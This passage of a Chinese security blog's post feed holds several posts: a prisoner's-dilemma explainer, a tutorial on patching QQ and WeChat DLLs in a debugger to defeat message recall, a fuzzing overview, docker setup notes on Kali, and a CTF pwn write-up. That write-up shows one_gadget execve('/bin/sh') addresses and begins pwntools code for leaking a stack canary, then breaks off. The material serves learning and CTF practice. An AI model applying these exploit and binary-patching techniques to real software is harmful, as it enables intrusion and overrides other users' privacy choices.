alt="双方背叛/双方合作"></p></blockquote><blockquote><p>若二人都互相检举（互相“背叛”），则二人同样判监8年。</p></blockquote><p><strong>表格描述</strong></p><table><thead><tr><th>囚徒行为</th><th>甲沉默（合作）</th><th>甲认罪（背叛）</th></tr></thead><tbody><tr><td>乙沉默（合作）</td><td>二人同服刑1年</td><td>甲当即释放，乙服刑10年</td></tr><tr><td>乙认罪（背叛）</td><td>乙当即释放，甲服刑10年</td><td>二人同服刑8年</td></tr></tbody></table><p>如同博弈论的其他例证，囚徒困境假定每个参与者（即“囚徒”）都是利己的，即都寻求最大自身利益，而不关心另一参与者的利益。参与者某一策略所得利益，如果在任何情况下都比其他策略要低的话，此策略称为“严格劣势策略”，理性的参与者绝不会选择。另外，没有任何其他力量干预个人决策，参与者可完全按照自己意愿选择策略。</p><hr><h3 id="思维实验0-1"><a href="#思维实验0-1" class="headerlink" title="思维实验0"></a>思维实验0</h3><p>（1）从个体来看，囚徒的选择如下：</p><ul><li>如果对方选择沉默，背叛可以使我获释</li><li>如果对方选择背叛，背叛可以使我的刑期减少</li></ul><p><strong>即从个体角度出发，背叛无疑是最优选择。</strong> 这场博弈中唯一可能达到的纳什均衡，就是双方参与者都背叛对方，结果二人同样服刑8年。</p><p>（2）从团体角度来看，如果两个参与者都合作保持沉默，两人都只会被判刑一年，总体利益更高，结果也比两人背叛对方、判刑8年的情况较佳。但根据以上假设，二人均为理性的个人，且只追求自己个人利益。均衡状况会是两个囚徒都选择背叛，结果二人判决均比合作为高，总体利益较合作为低。这就是“困境”所在。例子漂亮地证明了：非零和博弈中，<a href="https://wiki.mbalib.com/wiki/%E5%B8%95%E7%B4%AF%E6%89%98%E6%9C%80%E4%BC%98" target="_blank" rel="noopener">帕累托最优</a>和<a href="https://wiki.mbalib.com/wiki/%E7%BA%B3%E4%BB%80%E5%9D%87%E8%A1%A1" target="_blank" rel="noopener">纳什均衡</a>是相冲突的。</p><hr><h3 id="思维实验1-1"><a href="#思维实验1-1" class="headerlink" title="思维实验1"></a>思维实验1</h3><p><strong>当囚徒困境多次重复发生</strong></p><blockquote><p>单次发生的囚徒困境，和多次重复的囚徒困境结果不会一样。在重复的囚徒困境中，博弈被反复地进行。因而每个参与者都有机会去“惩罚”另一个参与者前一回合的不合作行为。这时，合作可能会作为均衡的结果出现。欺骗的动机这时可能被受到惩罚的威胁所克服，从而可能导向一个较好的、合作的结果。作为反复接近无限的数量，纳什均衡趋向于帕累托最优。</p></blockquote><hr><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p><strong>囚徒困境主旨</strong></p><blockquote><p>囚徒困境的主旨为，囚徒们虽然彼此合作，坚决不坦白，可为全体带来最佳利益（累计和最少刑期），但在资讯不明的情况下，因为出卖同伙可为自己带来利益（缩短刑期）。同伙坦白可为他带来利益，因此彼此出卖虽违反最佳共同利益，反而是自己最大利益所在。但实际上，执法机构不可能设立如此情境来诱使所有囚徒招供，因为囚徒们必须考虑刑期以外之因素（出卖同伙会受到报复等），而无法完全以执法者所设立之利益（刑期）作考量。</p></blockquote><p><strong>囚徒困境的应用</strong></p><blockquote><p>许多行业的价格竞争都是典型的囚徒困境现象，每家企业都以对方为敌手，只关心自己的利益。在价格博弈中，只要以对方为敌手，那么不管对方的决策怎样，自己总是以为采取低价策略会占便宜，这就促使双方都采取低价策略。如可口可乐公司和百事可乐公司之间的竞争、各大航空公司之间的价格竞争等等。</p></blockquote><blockquote><p>在国内的家电大战中，虽然不是两个对手之间的博弈，但由于在众多对手当中每一方的市场份额都很大，每一个主体人的行为后果受对手行为的影响都很大，因此，其情景大概也是如此。如果清楚这种前景，双方勾结或合作起来，都制定比较高的价格，那么双方都可以因为避免价格大战而获得较高的利润。但是往往这些联盟处于利益驱动的“囚徒困境”，双赢也就成泡影。五花八门的价格联盟总是非常短命，道理就在这里。</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 博弈论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 三姬分金 </tag>
            
            <tag> 囚徒困境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>授人以鱼不如授人以渔 | QQ、微信防撤回详解</title>
      <link href="/2020/04/03/revoke/"/>
      <url>/2020/04/03/revoke/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：哦吼？暗恋的女生/男生发消息又撤回了？表白没看到怎么办？！今天整理一下PC端QQ、微信防撤回的具体步骤，自己修改dll文件，再也不用担心网络上的dll被植入后门啦！<br>P.S. 本教程理论上适合目前更新的所有版本QQ/Wechat，但手法有些粗糙。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/2020040310205548.jpg" alt=""></p><h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><ol><li>x32dbg</li><li>PC端Wechat/QQ<h2 id="QQ防撤回"><a href="#QQ防撤回" class="headerlink" title="QQ防撤回"></a>QQ防撤回</h2><h3 id="QQ版本"><a href="#QQ版本" class="headerlink" title="QQ版本"></a>QQ版本</h3><img src="https://img-blog.csdnimg.cn/20200403102452473.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="QQ9.2.3"><h3 id="破解过程"><a href="#破解过程" class="headerlink" title="破解过程"></a>破解过程</h3>1.<strong>运行QQ，打开x32dbg，附加到进程QQ.exe</strong><br><img src="https://img-blog.csdnimg.cn/20200403103639294.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="附加程序"><br>2.<strong>在符号面板搜索im.dll，来到im.dll模块（该模块是负责QQ个人消息和群消息接收的模块）</strong><br><img src="https://img-blog.csdnimg.cn/20200403103808379.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="搜索im.dll"><br><img src="https://img-blog.csdnimg.cn/20200403104650553.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="im.dll模块界面"><br>3.<strong>搜索关键字符串：bytes_reserved 和 bytes_userdef</strong><br>“bytes_reserved”字符串负责个人信息的撤回，“bytes_userdef”字符串负责群消息的撤回。<br><img src="https://img-blog.csdnimg.cn/2020040310483365.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><img src="https://img-blog.csdnimg.cn/20200403104916254.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="搜索bytes_reserved字符串"><br>双击进入第三个字符串，在入口的上一条地址处，修改汇编指令，让其直接到达test eax,eax命令处，这样就避免了消息的撤回。<br><img src="https://img-blog.csdnimg.cn/20200403105030615.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="注意是修改push ecx"><br><img src="https://img-blog.csdnimg.cn/20200403105137382.jpg#pic_center" alt="修改完成"><br><img src="https://img-blog.csdnimg.cn/2020040310520227.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="搜索bytes_userdef字符串"><br><img src="https://img-blog.csdnimg.cn/20200403105236880.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="bytes_userdef界面"><br><img src="https://img-blog.csdnimg.cn/20200403105352664.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="修改push指令为jmp"><br>注意，此处是直接从push im.7A9D7C68处跳转到 test eax,eax<br><img src="https://img-blog.csdnimg.cn/20200403105520279.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="完成修改"><ol start="4"><li><strong>保存补丁并导出IM.dll文件进行替换</strong><br><img src="https://img-blog.csdnimg.cn/20200403105714928.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="生成补丁"><br><img src="https://img-blog.csdnimg.cn/20200403105738387.jpg#pic_center" alt="导出为IM.dll"></li><li><strong>成果图</strong><br><img src="https://img-blog.csdnimg.cn/20200403110152765.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="防撤回成功"><h3 id="过程总结"><a href="#过程总结" class="headerlink" title="过程总结"></a>过程总结</h3>QQ消息撤回的机制并没有进行很好的防御，主要原因在于已经接受到的消息，是储存在本地的，而消息撤回，则是调用函数从本地撤回，只要阻止这个机制就能实现消息的防撤回。由于时间原因，过程中的部分函数的原理没有深究，准备后期再来分析一下，要是能做出一个一体化的exe文件就更好了。总体来说，这个防撤回做的还是很有意思，在过程中能学到很多东西。<h2 id="微信防撤回"><a href="#微信防撤回" class="headerlink" title="微信防撤回"></a>微信防撤回</h2><h3 id="微信版本"><a href="#微信版本" class="headerlink" title="微信版本"></a>微信版本</h3><img src="https://img-blog.csdnimg.cn/20200403110313354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="微信 2.8.0.121"><h3 id="破解过程-1"><a href="#破解过程-1" class="headerlink" title="破解过程"></a>破解过程</h3></li><li><strong>启动微信，打开x32dbg，附加到微信进程。</strong><br>附加到wechat.exe后，在符号面板找到wechatwin.dll模块（该模块负责微信消息的撤回）<br><img src="https://img-blog.csdnimg.cn/20200403110537601.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="找到wechatwin.dll"></li><li><strong>在wechatwin.dll模块中寻找revokemsg字符串</strong><br><img src="https://img-blog.csdnimg.cn/20200403110823983.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="wechatwin.dll模块"><br>“revokemsg”出现次数可能较多，要选择在<strong>ChatMgr::RefreshUnReadCountByRevoke</strong>下面的第一个(L “&lt; revokemsg &gt;”不算)<br><img src="https://img-blog.csdnimg.cn/20200403110857557.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="搜索revoke，找到revokemsg字符串"></li><li><strong>点击跳转之后把当前位置下的第一个call指令nop掉</strong>（该call指令用于撤回消息）<br><img src="https://img-blog.csdnimg.cn/2020040311210256.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="nop 目标指令"><br><img src="https://img-blog.csdnimg.cn/20200403112143901.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="nop完成"></li><li><strong>保存补丁文件、导出WeChatWin.dll文件并替换原安装目录下的文件</strong><br><img src="https://img-blog.csdnimg.cn/20200403112300717.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="保存补丁"></li><li><strong>成果图</strong><br><img src="https://img-blog.csdnimg.cn/20200403112358499.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="破解成功"><h3 id="过程总结-1"><a href="#过程总结-1" class="headerlink" title="过程总结"></a>过程总结</h3>微信消息的撤回破解，重点还是在WechatWin.dll文件中，需要通过逆向找到dll文件中执行相关命令的函数，并nop掉（和上述QQ消息防撤回大同小异，一个是jmp跳转，一个是nop）。直接nop的手法还是显得有些粗糙。在查找资料的过程中，看到有些大佬是使用hook技术实现的消息防撤回机制，大感羡慕…在以后的学习过程中，想学习一些hook技术，在微信消息撤回时触发hook机制，以一个对话框的形式展示撤回内容。</li></ol></li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> crack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> QQ </tag>
            
            <tag> Wechat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞挖掘 | 简单高效的模糊测试Fuzzing</title>
      <link href="/2020/03/31/fuzzing/"/>
      <url>/2020/03/31/fuzzing/</url>
      
        <content type="html"><![CDATA[<blockquote><p>摘要：Fuzzing是一种通过构造输入来发现软件中的漏洞的一个简单高效的模糊测试方法。</p></blockquote><blockquote><p>前言：打CTF的时候就听说过几次fuzzing方法，大概知道是一种检测漏洞的方法，一直没了解过，今天抽个时间学习了一下。</p></blockquote><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>Fuzzing方法是指通过构造测试输入，对软件进行大量测试来发现软件中的漏洞的一种模糊测试方式。在现实的漏洞挖掘中，fuzzing因其简单高效的优势，成为非常主流的漏洞挖掘方法。</p><blockquote><p>模糊测试 （fuzz testing, fuzzing）是一种软件测试技术。其核心思想是将自动或半自动生成的随机数据输入到一个程序中，并监视程序异常，如崩溃，断言（assertion）失败，以发现可能的程序错误，比如内存泄漏。模糊测试常常用于检测软件或计算机系统的安全漏洞。<br>——来自Wikipedia</p></blockquote><h2 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h2><p>模糊测试通常被用于<strong>黑盒测试</strong>。其回报率通常比较高。当然，模糊测试只是相当于对系统的行为做了一个随机采样，所以在许多情况下通过了模糊测试只是说明软件可以处理异常以避免崩溃，而不能说明该软件的行为完全正确。这表明模糊测试更多是一种对整体质量的保证，并不能替代全面的测试或者形式化方法。作为一种粗略的可靠性度量方法，模糊测试可以提示程序哪些部件需要特殊的注意。对于这些部件可以进一步使用代码审计，静态分析以及代码重写。</p><h2 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h2><p>模糊测试工具通常可以被分为两类。<strong>变异测试</strong>通过改变已有的数据样本去生成测试数据。<strong>生成测试</strong>则通过对程序输入的建模来生成新的测试数据。</p><p>最简单的模糊测试是通过命令行，网络包或者事件向一个程序输入一段随机比特流。这种技术当前依然是有效的发现程序错误的方法。另一个常见且易于实现的技术是通过随机反转一些比特或者整体移动一些数据块来变异已有的输入数据。但是，最有效的模糊测试需要能够理解被测试对象的格式或者协议。这可以通过阅读设计规格来实现。基于设计规格的模糊工具包含完整的规格，并通过基于模型的测试生成方法去遍历规格，并在数据内容，结构，消息，序列中引入一些异常。这种“聪明的”模糊测试也被称作<strong>健壮性测试，句法测试，语法测试以及错误注入</strong>。这种协议感知的特性也可以启发式的从例子中生成。相关的工具有Sequitur。</p><p>模糊测试也可以与其他技术结合。白盒模糊测试结合了符号执行技术与约束求解技术。演化模糊测试则利用了一个启发的反馈来有效的实现自动的探索性测试。</p><h2 id="详细说明"><a href="#详细说明" class="headerlink" title="详细说明"></a>详细说明</h2><h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p><img src="https://img-blog.csdnimg.cn/20200331225732678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="Fuzzing基本流程"></p><h3 id="1-大量的测试用例"><a href="#1-大量的测试用例" class="headerlink" title="1.大量的测试用例"></a>1.大量的测试用例</h3><p>进行模糊测试的首要条件就是需要大量的测试用例（即种子输入），例如Charlie Miller对Reader 9.2.0进行的fuzzing测试，他首先从网上的1515个文件变异得到3036000个测试用例进行测试，最后得到crash。在对Preview这个软件做测试时，用了大概2790000个测试用例进行测试才得以拿到crash。这些数字跟我们的直观感受就是我们需要获得大量的测试用例，才能保证模糊测试过程中拿到程序的crash。</p><h3 id="2-对测试用例做过滤"><a href="#2-对测试用例做过滤" class="headerlink" title="2.对测试用例做过滤"></a>2.对测试用例做过滤</h3><p>实际情况中，并不是说拿很多的测试用例就可以去测试软件就可以拿到漏洞，即fuzzing测试并不是简单的关于生成测试用例去做测试的故事，而是一个关于怎么对测试用例做过滤的故事。并不是说得到几十万量级的测试用例之后，就可以拿到漏洞了，而实际上，这几十万个测试用例都是精品，用这些精品进行测试才得以发现的漏洞，那么怎么把这些精品过滤出来，这才是关键，也是我们在进行fuzzing测试过程中需要做的第二件重要的准备工作。</p><p>比如Charlie Miller在测试PDF的时候，他把网上所有能够下载到的80000个PDF文档都下载下来，然后找到一个最小的子集，这个子集的代码覆盖率和全集的代码覆盖率是一样的，这个最小的子集也就是软件测试中的最初始的集合—1515个文件，在这个最初始的集合上再去做fuzz，这就是一个筛选的过程，我们可以用代码覆盖率作为衡量标准，当然也可以选择其他合适的标准来完成这一筛选过程。</p><h3 id="3-要用正确的方法"><a href="#3-要用正确的方法" class="headerlink" title="3.要用正确的方法"></a>3.要用正确的方法</h3><p>Laurent Gaffié说过，他在研究SMB协议的远程调用接口的时候，最先做了很多工作，结果都失败了，直到他将策略改变成了用单字节的网络数据包，才有了大量的产量。所以fuzzing是要讲方法的，要想清楚可能出问题的是什么地方，你要用什么样的方法去把这个东西找出来，关于方法，每年都有很多的论文，大家可以去看。</p><p>Charlie Miller也说，很多关于fuzzing的报告都是讲述如何成功，但是现实中的fuzzing大部分都是讲关于失败的。可见在现实中做fuzz测试的时候，你会遇到很多挫折。所以找到正确的方法非常重要！CharlieMiller和Laurent Gaffié给出的代码虽然看起来很不起眼，但一旦找到了正确的方法，得到的结果往往很令人惊喜。</p><h3 id="4-花90-时间阅读文档"><a href="#4-花90-时间阅读文档" class="headerlink" title="4.花90%时间阅读文档"></a>4.花90%时间阅读文档</h3><p>还有一个问题，就是做fuzzing的人，并不是简单的写几行代码，对着软件一通测试就会出来结果。在做fuzzing之前，会有很多的时间是花在阅读文档上的。</p><p>对于复杂的程序，我们要去分析这个程序的功能是什么，它可能出问题的地方在什么位置，会有大量的几乎90%的时间是花在这上面的，这是Charlie Miller和Laurent Gaffié的一个评估。</p><h3 id="5-Fuzzing工具"><a href="#5-Fuzzing工具" class="headerlink" title="5.Fuzzing工具"></a>5.Fuzzing工具</h3><p>AFL，它是目前最受欢迎的一个工具，是一个导向型的fuzzing工具。 Fuzzing通常由盲fuzzing（blind fuzzing）和导向性fuzzing（guided fuzzing）两种。blind fuzzing生成测试数据的时候不考虑数据的质量，通过大量测试数据来概率性地触发漏洞。Guided fuzzing则关注测试数据的质量，期望生成更有效的测试数据来触发漏洞的概率。比如，通过测试覆盖率来衡量测试输入的质量，希望生成有更高测试覆盖率的数据，从而提升触发漏洞的概率。</p><p>AFL这个工具出来的一个起因就是AFL的开发者认为盲fuzzing的效率是比较低的；第二个原因就是Charlie Miller和Laurent Gaffié所做的样本筛选的方法是有效果的；还有第三个原因就是符号执行，符号执行在理论是非常不错的，但在实际中经常受到可行性、性能等方面的限制。于是在这样一个背景下，AFL出现了。</p><p>AFL有两个关键词：指令插桩和边覆盖。首先AFL是基于插桩的，能够辅助程序分析；其次AFL是基于边覆盖的，是对Charlie Miller等人基于块覆盖用样本筛选的一个改进和提升。<br>参考：<br><a href="https://zh.wikipedia.org/wiki/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95" target="_blank" rel="noopener">1.模糊测试-维基百科</a><br><a href="https://www.freebuf.com/news/193602.html" target="_blank" rel="noopener">2.简单高效的模糊测试Fuzzing</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali linux下docker与docker-compose的安装及两者差异</title>
      <link href="/2020/03/27/kali-docker/"/>
      <url>/2020/03/27/kali-docker/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近接了一个漏洞环境搭建的活，需要用到docker和docker-compose。因为物理机是Win10的，安装docker需要开启Hyper-V，但是Hyper-V和Vmware冲突。所以就在kali虚拟机里面搭了docker。下面记录一下搭建过程。</p><h2 id="安装docker："><a href="#安装docker：" class="headerlink" title="安装docker："></a>安装docker：</h2><pre><code>step1.apt-get updateapt-get install -y apt-transport-https ca-certificatesapt-get install dirmngrstep2.apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609Dstep3.echo 'deb https://apt.dockerproject.org/repo debian-stretch main' &gt; /etc/apt/sources.list.d/docker.liststep4.apt-get updatess-local -c /etc/shadowsocks.json (起飞机)proxychains4 apt-get install docker-engine 代理下载</code></pre><p><img src="https://img-blog.csdnimg.cn/20200327005202102.jpg" alt="docker 搭建成功"></p><h2 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h2><pre><code>ss-local -c /etc/shadowsocks.jsonproxychains4 curl -L https://github.com/docker/compose/releases/download/1.25.0-rc1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</code></pre><h2 id="docker和docker-compose的对比"><a href="#docker和docker-compose的对比" class="headerlink" title="docker和docker-compose的对比"></a>docker和docker-compose的对比</h2><p><strong>介绍</strong></p><blockquote><p>docker是一个供开发和运维人员开发，测试，部署和运行应用的容器平台。<br>compose是一个用于运行和管理多个容器化应用的工具。</p></blockquote><p><strong>对比</strong></p><ul><li>docker是自动化构建镜像，并启动镜像。 docker compose是自动化编排容器。</li><li>docker是基于Dockerfile得到images,启动的时候是一个单独的container</li><li>docker-compose是基于docker-compose.yml,通常启动的时候是一个服务，这个服务通常由多个container共同组成，并且端口，配置等由docker-compose定义好。</li><li>两者都需要安装，但是要使用docker-compose，必须已经安装docker</li></ul><p>参考博客：<br><a href="https://blog.51cto.com/11834557/2309885" target="_blank" rel="noopener">Linux下docker安装</a><br><a href="https://blog.csdn.net/hero_hope/article/details/91168836" target="_blank" rel="noopener">Linux下docker-compose安装</a><br><a href="https://www.jianshu.com/p/5794ec7e603b" target="_blank" rel="noopener">docker与docker-compose介绍，对比与使用</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>one_gadget用法|攻防世界pwn进阶区babystack</title>
      <link href="/2020/03/25/babystack/"/>
      <url>/2020/03/25/babystack/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-检查保护"><a href="#0x00-检查保护" class="headerlink" title="0x00.检查保护"></a>0x00.检查保护</h2><pre><code>devil@ubuntu:~/adworld/pwn$ checksec babystack[*] '/home/devil/adworld/pwn/babystack'    Arch:     amd64-64-little    RELRO:    Full RELRO ;无法修改got表    Stack:    Canary found ;不能直接进行溢出    NX:       NX enabled ;堆栈不可执行    PIE:      No PIE (0x400000)</code></pre><h2 id="0x01-one-gadget"><a href="#0x01-one-gadget" class="headerlink" title="0x01.one_gadget"></a>0x01.one_gadget</h2><p>本题给了libc版本，可以使用<strong>one_gadget</strong>工具<br>我也是第一次使用one_gadget，简单介绍一下：</p><blockquote><p>功能：查找已知的libc中exevce(“/bin/sh”)语句的地址<br>用法: one_gadget libc-x.xx.so<br><a href="https://github.com/david942j/one_gadget">官方文档点击此处</a></p></blockquote><pre><code>devil@ubuntu:~/adworld/pwn$ one_gadget libc-2.23.so0x45216 execve("/bin/sh", rsp+0x30, environ)constraints:  rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf0274 execve("/bin/sh", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1117 execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL</code></pre><p>通过使用one_gadget可以找到获得shell的函数的地址</p><pre class="line-numbers language-yaml"><code class="language-yaml">execve_addr = 0x45216<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x02-ida调试"><a href="#0x02-ida调试" class="headerlink" title="0x02.ida调试"></a>0x02.ida调试</h2><p><img src="https://img-blog.csdnimg.cn/20200325005840582.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="ida调试确定输入和canary距离"><br>可以看出v6储存的是canary，s是我们输入的字符串，二者相距0x88字节。<br>则我们先输入0x88个字节，再利用print函数就可以把canary的值带出来。<br><strong>代码如下：</strong></p><pre class="line-numbers language-python"><code class="language-python">payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x88</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" 